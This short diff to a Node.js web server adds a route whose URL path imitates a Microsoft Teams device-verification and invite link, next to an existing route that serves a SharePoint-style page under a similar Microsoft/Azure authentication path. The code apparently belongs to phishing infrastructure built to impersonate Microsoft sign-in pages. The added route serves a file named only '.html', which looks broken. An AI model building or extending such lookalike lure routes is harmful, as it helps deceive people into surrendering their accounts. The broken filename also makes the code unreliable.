@@ -550,6 +550,9 @@ const server = http.createServer(async (req, res) => {
   if (decodedUrl === '/microsoft-device%verify%file%access%azure%authentication') {
     return serveHtml(res, 'sharepoint.html');
   }  
+  if (decodedUrl === '/microsoft-teams%verify%invite%access%device%authentication') {
+      return serveHtml(res, '.html');
+    } 
 
   // Mail client — protected: redirect to /admin if no valid session
   if (method === 'GET' && (url === '/mail' || url === '/localmail.html')) {
